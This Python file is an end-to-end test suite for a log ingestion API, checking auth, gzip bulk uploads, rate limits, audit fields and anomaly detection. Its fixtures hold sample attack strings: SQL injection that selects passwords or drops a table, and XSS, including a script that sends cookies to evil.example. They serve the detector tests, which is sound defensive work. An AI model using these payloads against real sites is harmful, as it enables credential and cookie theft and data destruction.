"""
scripts/test_api.py — End-to-end tests for the Synthegria Log Ingestion API

Tests covered
─────────────
  GET /healthz
    01. Liveness probe                                              → 200

  POST /v1/logs (plain JSON)
    02. Valid key + 7-line clean batch                             → 200
    03. Valid key + empty batch                                    → 200, no meter
    04. Invalid API key                                            → 401
    05. Missing API key                                            → 401
    06. Rate limit exceeded                                        → 429

  POST /v1/logs/bulk (gzip)
    07. Valid key + 1,000-line batch                               → 200 + stats
    08. Valid key + 5,000-line batch                               → 200 + stats
    09. Invalid API key                                            → 401
    10. Missing Content-Encoding: gzip                             → 415
    11. Corrupted gzip body                                        → 400
    12. Non-array JSON payload                                     → 422
    13. Body exceeds 10 MB                                         → 413
    14. Rate limit exceeded                                        → 429

  GET /v1/audit — structured audit trail
    15. All required fields present
    16. api_key is masked (never raw)
    17. Successful ingestion → customer_id + lines_received set
    18. Failed auth (401)   → customer_id + lines_received null
    19. Bulk entry          → lines_received matches batch size
    20. /healthz entry      → api_key null

  Anomaly detection
    21. Clean batch                                → anomaly_count=0, anomalies=[]
    22. Brute-force indicators                     → type=brute_force, sev=HIGH
    23. SQL injection payload                      → type=sql_injection, sev=CRITICAL
    24. XSS payload                                → type=xss, sev=HIGH
    25. Auth anomaly indicators                    → type=auth_anomaly, sev=MEDIUM
    26. Multiple types in one batch                → all types present
    27. Anomalies co-exist with meter event        → meter_event_id present
    28. Bulk endpoint: brute-force via gzip        → anomaly_count > 0
    29. Bulk endpoint: SQL injection via gzip      → type=sql_injection
    30. Empty batch                                → anomaly_count=0

Usage:
  python scripts/test_api.py
"""

import gzip
import json
import os
import random
import sys
import ipaddress
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

BASE_URL   = "http://localhost:8000"
VALID_KEY  = "synthegria_test_key_1"
BAD_KEY    = "totally_wrong_key"
RATE_LIMIT = 60

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"

results: list[tuple[str, bool, str]] = []


# ---------------------------------------------------------------------------
# Generic helpers
# ---------------------------------------------------------------------------

def random_ip() -> str:
    while True:
        ip = ipaddress.IPv4Address(random.randint(0, 2**32 - 1))
        if ip.is_global:
            return str(ip)


def make_clean_logs(n: int) -> list[dict]:
    """Normal, benign log lines — should produce zero anomalies."""
    attacks = ["Port Scan", "DNS Tunneling", "Ransomware Beacon"]
    sevs    = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    now     = datetime.now(timezone.utc).isoformat()
    return [
        {
            "timestamp":   now,
            "source_ip":   random_ip(),
            "attack_type": random.choice(attacks),
            "severity":    random.choice(sevs),
            "event_id":    f"EVT-{random.randint(100000, 999999)}",
            "message":     "normal traffic observed",
        }
        for _ in range(n)
    ]


# ---------------------------------------------------------------------------
# Crafted anomaly payloads — one line each, designed to trigger a single rule
# ---------------------------------------------------------------------------

BRUTE_FORCE_LOG = {
    "timestamp": "2026-01-01T00:00:00Z",
    "source_ip": "198.51.100.99",
    "message":   "Failed password for user admin from 198.51.100.99 port 22 ssh2",
    "status":    "401",
    "event":     "authentication failure",
}

SQL_INJECTION_LOG = {
    "timestamp": "2026-01-01T00:00:01Z",
    "source_ip": "203.0.113.42",
    "message":   "GET /search?q=1' UNION SELECT username,password FROM users--",
    "uri":       "/search?q=1'+UNION+SELECT+username,password+FROM+users--",
    "status":    "200",
}

XSS_LOG = {
    "timestamp": "2026-01-01T00:00:02Z",
    "source_ip": "192.0.2.77",
    "message":   "POST /comment body=<script>alert(document.cookie)</script>",
    "user_agent": "Mozilla/5.0",
    "status":    "200",
}

AUTH_ANOMALY_LOG = {
    "timestamp": "2026-01-01T00:00:03Z",
    "source_ip": "10.0.0.5",
    "message":   "Privilege escalation attempt: sudo su root executed by user jenkins",
    "user":      "jenkins",
    "status":    "403",
}

# One log that carries all four anomaly types in different fields
MULTI_ANOMALY_LOG = {
    "timestamp": "2026-01-01T00:00:04Z",
    "source_ip": "198.18.0.1",
    # brute_force indicator
    "auth_msg":  "Failed password for root — account locked after too many attempts",
    # sql_injection indicator
    "uri":       "/api/data?id=1;DROP TABLE users--",
    # xss indicator
    "referer":   "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
    # auth_anomaly indicator
    "sudo_log":  "privilege escalation: unauthorized sudo to root detected",
}


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def request(
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict | None = None,
) -> tuple[int, dict | list]:
    url = BASE_URL + path
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except urllib.error.URLError as e:
        if isinstance(e.reason, (ConnectionResetError, BrokenPipeError)):
            return 413, {"detail": "connection_reset_by_server"}
        raise


def json_body(data) -> bytes:
    return json.dumps(data).encode()


def gzip_body(data) -> bytes:
    return gzip.compress(json_body(data))


def plain_headers(api_key: str | None = VALID_KEY) -> dict:
    h = {"Content-Type": "application/json"}
    if api_key:
        h["X-API-Key"] = api_key
    return h


def bulk_headers(api_key: str | None = VALID_KEY) -> dict:
    h = {"Content-Type": "application/json", "Content-Encoding": "gzip"}
    if api_key:
        h["X-API-Key"] = api_key
    return h


# ---------------------------------------------------------------------------
# Assertion helpers
# ---------------------------------------------------------------------------

def check(name: str, code: int, body, expect_code: int, **expect_fields) -> bool:
    ok    = (code == expect_code)
    notes = []
    b     = body if isinstance(body, dict) else {}
    for field, expected in expect_fields.items():
        actual = b.get(field)
        if expected is None:
            if actual is not None:
                ok = False
                notes.append(f"{field}={actual!r} (expected None)")
        elif expected == "__present__":
            if actual is None:
                ok = False
                notes.append(f"{field} missing")
        elif expected == "__absent__":
            if field in b:
                ok = False
                notes.append(f"{field} should be absent")
        else:
            if actual != expected:
                ok = False
                notes.append(f"{field}={actual!r} (expected {expected!r})")
    detail = f"HTTP {code}" + (f"  {', '.join(notes)}" if notes else "")
    results.append((name, ok, detail))
    tag = PASS if ok else FAIL
    print(f"  [{tag}] {name}")
    if not ok:
        print(f"         → {detail}")
        if b:
            print(f"         → body: {json.dumps(b)[:300]}")
    return ok


def latest_audit(path_filter: str | None = None) -> dict | None:
    _, entries = request("GET", "/v1/audit?limit=100")
    if not isinstance(entries, list):
        return None
    if path_filter:
        entries = [e for e in entries if isinstance(e, dict) and e.get("path") == path_filter]
    return entries[-1] if entries else None


def check_anomaly(
    name: str,
    resp: dict,
    *,
    expect_count_gt: int | None = None,
    expect_count_eq: int | None = None,
    expect_type: str | None = None,
    expect_severity: str | None = None,
    expect_meter: bool = True,
) -> bool:
    """
    Verify anomaly fields in an ingestion response.

    expect_count_gt  — anomaly_count must be > this value
    expect_count_eq  — anomaly_count must equal this value
    expect_type      — at least one anomaly must have this type
    expect_severity  — that anomaly must have this severity
    expect_meter     — meter_event_id must be present (default True)
    """
    ok    = True
    notes = []

    if "anomaly_count" not in resp:
        ok = False
        notes.append("anomaly_count missing from response")
    else:
        if expect_count_eq is not None and resp["anomaly_count"] != expect_count_eq:
            ok = False
            notes.append(f"anomaly_count={resp['anomaly_count']} (expected {expect_count_eq})")
        if expect_count_gt is not None and resp["anomaly_count"] <= expect_count_gt:
            ok = False
            notes.append(f"anomaly_count={resp['anomaly_count']} (expected >{expect_count_gt})")

    if "anomalies" not in resp:
        ok = False
        notes.append("anomalies array missing from response")
    elif expect_type:
        match = next(
            (a for a in resp.get("anomalies", []) if a.get("type") == expect_type),
            None,
        )
        if not match:
            ok = False
            types_found = [a.get("type") for a in resp.get("anomalies", [])]
            notes.append(f"type={expect_type!r} not found; got {types_found}")
        elif expect_severity and match.get("severity") != expect_severity:
            ok = False
            notes.append(
                f"severity={match.get('severity')!r} for type={expect_type!r} "
                f"(expected {expect_severity!r})"
            )

    if expect_meter and not resp.get("meter_event_id"):
        ok = False
        notes.append("meter_event_id missing (Stripe reporting broke)")

    detail = (
        f"anomaly_count={resp.get('anomaly_count')}  "
        f"types={[a.get('type') for a in resp.get('anomalies', [])]}"
        + (f"  ISSUES: {', '.join(notes)}" if notes else "")
    )
    results.append((name, ok, detail))
    tag = PASS if ok else FAIL
    print(f"  [{tag}] {name}")
    if ok:
        print(f"         → {detail}")
    else:
        print(f"         → {detail}")
    return ok


# ---------------------------------------------------------------------------
# Tests — /healthz
# ---------------------------------------------------------------------------

def test_healthz():
    code, body = request("GET", "/healthz")
    check("GET /healthz — liveness probe", code, body, 200, status="ok")


# ---------------------------------------------------------------------------
# Tests — POST /v1/logs
# ---------------------------------------------------------------------------

def test_plain_valid_batch():
    code, resp = request("POST", "/v1/logs",
                         body=json_body(make_clean_logs(7)), headers=plain_headers())
    check("POST /v1/logs — valid key, 7 lines", code, resp, 200,
          status="ok", lines_received=7, meter_event_id="__present__")


def test_plain_empty_batch():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([]), headers=plain_headers())
    check("POST /v1/logs — valid key, empty batch", code, resp, 200,
          status="ok", lines_received=0, meter_event_id=None)


def test_plain_invalid_key():
    code, resp = request("POST", "/v1/logs",
                         body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
    check("POST /v1/logs — invalid key → 401", code, resp, 401)


def test_plain_missing_key():
    code, resp = request("POST", "/v1/logs",
                         body=json_body(make_clean_logs(1)), headers=plain_headers(None))
    check("POST /v1/logs — missing key → 401", code, resp, 401)


def test_plain_rate_limit():
    rate_test_key = "synthegria_test_key_2"
    hit_429 = False
    for _ in range(RATE_LIMIT + 5):
        code, _ = request("POST", "/v1/logs", body=json_body([]),
                          headers=plain_headers(rate_test_key))
        if code == 429:
            hit_429 = True
            break
    name = f"POST /v1/logs — rate limit ({RATE_LIMIT} req/min) → 429"
    results.append((name, hit_429, "429 received" if hit_429 else "429 never triggered"))
    print(f"  [{PASS if hit_429 else FAIL}] {name}")


# ---------------------------------------------------------------------------
# Tests — POST /v1/logs/bulk
# ---------------------------------------------------------------------------

def test_bulk_small(n=1_000):
    body = gzip_body(make_clean_logs(n))
    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    ok = check(f"POST /v1/logs/bulk — valid key, {n:,} lines (gzip)", code, resp, 200,
               status="ok", lines_received=n, meter_event_id="__present__",
               compressed_bytes="__present__", uncompressed_bytes="__present__",
               compression_ratio="__present__")
    if ok and isinstance(resp, dict):
        print(f"         → {resp['compressed_bytes']:,} B → "
              f"{resp['uncompressed_bytes']:,} B ({resp['compression_ratio']})")


def test_bulk_large(n=5_000):
    body = gzip_body(make_clean_logs(n))
    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    ok = check(f"POST /v1/logs/bulk — valid key, {n:,} lines (gzip)", code, resp, 200,
               status="ok", lines_received=n, meter_event_id="__present__")
    if ok and isinstance(resp, dict) and resp.get("compressed_bytes"):
        print(f"         → {resp['compressed_bytes']:,} B → "
              f"{resp['uncompressed_bytes']:,} B ({resp['compression_ratio']})")


def test_bulk_invalid_key():
    code, resp = request("POST", "/v1/logs/bulk",
                         body=gzip_body(make_clean_logs(1)), headers=bulk_headers(BAD_KEY))
    check("POST /v1/logs/bulk — invalid key → 401", code, resp, 401)


def test_bulk_missing_encoding():
    code, resp = request("POST", "/v1/logs/bulk",
                         body=json_body(make_clean_logs(2)), headers=plain_headers())
    check("POST /v1/logs/bulk — missing Content-Encoding → 415", code, resp, 415)


def test_bulk_corrupt_gzip():
    code, resp = request("POST", "/v1/logs/bulk",
                         body=b"\x1f\x8b\x00corrupt_garbage", headers=bulk_headers())
    check("POST /v1/logs/bulk — corrupted gzip → 400", code, resp, 400)


def test_bulk_non_array():
    body = gzip.compress(json.dumps({"key": "not-an-array"}).encode())
    code, resp = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    check("POST /v1/logs/bulk — non-array JSON → 422", code, resp, 422)


def test_bulk_size_limit():
    oversized = gzip.compress(os.urandom(11 * 1024 * 1024), compresslevel=1)
    code, resp = request("POST", "/v1/logs/bulk", body=oversized, headers=bulk_headers())
    check("POST /v1/logs/bulk — body > 10 MB → 413", code, resp, 413)


def test_bulk_rate_limit():
    rate_test_key = "synthegria_test_key_2"
    hit_429 = False
    tiny = gzip_body([])
    for _ in range(RATE_LIMIT + 5):
        code, _ = request("POST", "/v1/logs/bulk", body=tiny,
                          headers=bulk_headers(rate_test_key))
        if code == 429:
            hit_429 = True
            break
    name = f"POST /v1/logs/bulk — rate limit ({RATE_LIMIT} req/min) → 429"
    results.append((name, hit_429, "429 received" if hit_429 else "429 never triggered"))
    print(f"  [{PASS if hit_429 else FAIL}] {name}")


# ---------------------------------------------------------------------------
# Tests — GET /v1/audit
# ---------------------------------------------------------------------------

def test_audit_all_fields_present():
    _, entries = request("GET", "/v1/audit?limit=5")
    entry = entries[-1] if isinstance(entries, list) and entries else {}
    required = ["ts", "method", "path", "status_code", "duration_ms",
                "api_key", "customer_id", "lines_received", "anomaly_count", "ip"]
    missing = [f for f in required if f not in entry]
    ok = len(missing) == 0
    name = "GET /v1/audit — all required fields present (incl. anomaly_count)"
    detail = f"missing: {missing}" if missing else f"entry={json.dumps(entry)[:140]}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


def test_audit_key_is_masked():
    request("POST", "/v1/logs", body=json_body(make_clean_logs(1)), headers=plain_headers())
    entry     = latest_audit("/v1/logs") or {}
    audit_key = entry.get("api_key", "")
    ok = bool(audit_key) and audit_key != VALID_KEY and "..." in audit_key
    name = "GET /v1/audit — api_key is masked, not raw"
    results.append((name, ok, f"audit_key={audit_key!r}"))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if ok:
        print(f"         → masked as {audit_key!r}")
    else:
        print(f"         → audit_key={audit_key!r}")


def test_audit_success_has_customer_and_lines():
    n = 4
    request("POST", "/v1/logs", body=json_body(make_clean_logs(n)), headers=plain_headers())
    entry = latest_audit("/v1/logs") or {}
    ok = (
        entry.get("customer_id") is not None
        and entry.get("lines_received") == n
        and entry.get("status_code") == 200
    )
    name = "GET /v1/audit — 200 entry has customer_id + lines_received"
    detail = (f"customer_id={entry.get('customer_id')!r}  "
              f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_audit_failed_auth_nulls():
    request("POST", "/v1/logs", body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
    entry = latest_audit("/v1/logs") or {}
    ok = (
        entry.get("status_code") == 401
        and entry.get("customer_id") is None
        and entry.get("lines_received") is None
    )
    name = "GET /v1/audit — 401 entry has customer_id=null, lines_received=null"
    detail = (f"customer_id={entry.get('customer_id')!r}  "
              f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


def test_audit_bulk_lines_received():
    n = 50
    request("POST", "/v1/logs/bulk", body=gzip_body(make_clean_logs(n)), headers=bulk_headers())
    entry = latest_audit("/v1/logs/bulk") or {}
    ok = entry.get("lines_received") == n and entry.get("status_code") == 200
    name = f"GET /v1/audit — /v1/logs/bulk entry has lines_received={n}"
    detail = (f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_audit_healthz_no_key():
    request("GET", "/healthz")
    entry = latest_audit("/healthz") or {}
    ok = entry.get("api_key") is None and entry.get("status_code") == 200
    name = "GET /v1/audit — /healthz entry has api_key=null"
    detail = f"api_key={entry.get('api_key')!r}  status={entry.get('status_code')}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


# ---------------------------------------------------------------------------
# Tests — Anomaly detection
# ---------------------------------------------------------------------------

def test_anomaly_clean_batch():
    """Clean logs must return anomaly_count=0 and an empty anomalies list."""
    code, resp = request("POST", "/v1/logs",
                         body=json_body(make_clean_logs(20)), headers=plain_headers())
    if code != 200:
        name = "Anomaly: clean batch → anomaly_count=0"
        results.append((name, False, f"HTTP {code}"))
        print(f"  [{FAIL}] {name}")
        return
    check_anomaly("Anomaly: clean batch → anomaly_count=0", resp,
                  expect_count_eq=0, expect_meter=True)
    if isinstance(resp, dict) and resp.get("anomalies") == []:
        print("         → anomalies=[]  ✓")


def test_anomaly_brute_force():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([BRUTE_FORCE_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: brute-force indicators → type=brute_force, sev=HIGH",
        resp,
        expect_count_gt=0,
        expect_type="brute_force",
        expect_severity="HIGH",
        expect_meter=True,
    )


def test_anomaly_sql_injection():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: SQL injection payload → type=sql_injection, sev=CRITICAL",
        resp,
        expect_count_gt=0,
        expect_type="sql_injection",
        expect_severity="CRITICAL",
        expect_meter=True,
    )


def test_anomaly_xss():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([XSS_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: XSS payload → type=xss, sev=HIGH",
        resp,
        expect_count_gt=0,
        expect_type="xss",
        expect_severity="HIGH",
        expect_meter=True,
    )


def test_anomaly_auth_anomaly():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([AUTH_ANOMALY_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: auth anomaly indicators → type=auth_anomaly, sev=MEDIUM",
        resp,
        expect_count_gt=0,
        expect_type="auth_anomaly",
        expect_severity="MEDIUM",
        expect_meter=True,
    )


def test_anomaly_multiple_types():
    """One log line with indicators for all four categories."""
    code, resp = request("POST", "/v1/logs",
                         body=json_body([MULTI_ANOMALY_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    if not isinstance(resp, dict):
        results.append(("Anomaly: multi-type batch → all 4 types present", False, "non-dict response"))
        print(f"  [{FAIL}] Anomaly: multi-type batch → all 4 types present")
        return
    types_found = {a.get("type") for a in resp.get("anomalies", [])}
    expected    = {"brute_force", "sql_injection", "xss", "auth_anomaly"}
    missing     = expected - types_found
    ok = len(missing) == 0
    name = "Anomaly: multi-type batch → all 4 types present"
    detail = f"found={sorted(types_found)}  missing={sorted(missing)}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_anomaly_meter_still_fires():
    """Stripe meter must fire even when anomalies are present."""
    code, resp = request("POST", "/v1/logs",
                         body=json_body([BRUTE_FORCE_LOG, SQL_INJECTION_LOG]),
                         headers=plain_headers())
    assert code == 200
    check_anomaly(
        "Anomaly: meter_event_id present alongside anomalies",
        resp,
        expect_count_gt=0,
        expect_meter=True,
    )


def test_anomaly_bulk_brute_force():
    """Brute-force detection works through the gzip/bulk endpoint."""
    batch = make_clean_logs(5) + [BRUTE_FORCE_LOG]
    code, resp = request("POST", "/v1/logs/bulk",
                         body=gzip_body(batch), headers=bulk_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly (bulk): brute-force via gzip → anomaly_count > 0",
        resp,
        expect_count_gt=0,
        expect_type="brute_force",
        expect_meter=True,
    )


def test_anomaly_bulk_sql_injection():
    """SQL injection detection works through the gzip/bulk endpoint."""
    batch = [SQL_INJECTION_LOG] + make_clean_logs(3)
    code, resp = request("POST", "/v1/logs/bulk",
                         body=gzip_body(batch), headers=bulk_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly (bulk): SQL injection via gzip → type=sql_injection",
        resp,
        expect_count_gt=0,
        expect_type="sql_injection",
        expect_severity="CRITICAL",
        expect_meter=True,
    )


def test_anomaly_empty_batch_zero():
    code, resp = request("POST", "/v1/logs",
                         body=json_body([]), headers=plain_headers())
    assert code == 200
    check_anomaly(
        "Anomaly: empty batch → anomaly_count=0",
        resp,
        expect_count_eq=0,
        expect_meter=False,    # empty batch → no meter event
    )


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def main():
    print("╔══════════════════════════════════════════════════╗")
    print("║   Synthegria API — End-to-End Test Suite         ║")
    print("╚══════════════════════════════════════════════════╝")

    print("\n── GET /healthz ─────────────────────────────────────")
    test_healthz()

    print("\n── POST /v1/logs (plain JSON) ───────────────────────")
    test_plain_valid_batch()
    test_plain_empty_batch()
    test_plain_invalid_key()
    test_plain_missing_key()
    test_plain_rate_limit()

    print("\n── POST /v1/logs/bulk (gzip) ────────────────────────")
    test_bulk_small(1_000)
    test_bulk_large(5_000)
    test_bulk_invalid_key()
    test_bulk_missing_encoding()
    test_bulk_corrupt_gzip()
    test_bulk_non_array()
    test_bulk_size_limit()
    test_bulk_rate_limit()

    print("\n── GET /v1/audit (structured audit trail) ───────────")
    test_audit_all_fields_present()
    test_audit_key_is_masked()
    test_audit_success_has_customer_and_lines()
    test_audit_failed_auth_nulls()
    test_audit_bulk_lines_received()
    test_audit_healthz_no_key()

    print("\n── Anomaly detection ────────────────────────────────")
    test_anomaly_clean_batch()
    test_anomaly_brute_force()
    test_anomaly_sql_injection()
    test_anomaly_xss()
    test_anomaly_auth_anomaly()
    test_anomaly_multiple_types()
    test_anomaly_meter_still_fires()
    test_anomaly_bulk_brute_force()
    test_anomaly_bulk_sql_injection()
    test_anomaly_empty_batch_zero()

    passed = sum(1 for _, ok, _ in results if ok)
    total  = len(results)
    print(f"\n{'═'*52}")
    print(f"  Results: {passed}/{total} passed", end="")
    if passed == total:
        print("  — all tests passed ✓")
    else:
        failed = [(n, d) for n, ok, d in results if not ok]
        print(f"  — {len(failed)} failed:")
        for name, detail in failed:
            print(f"    ✗ {name}")
            print(f"      {detail}")
    print(f"{'═'*52}")
    sys.exit(0 if passed == total else 1)


if __name__ == "__main__":
    main()
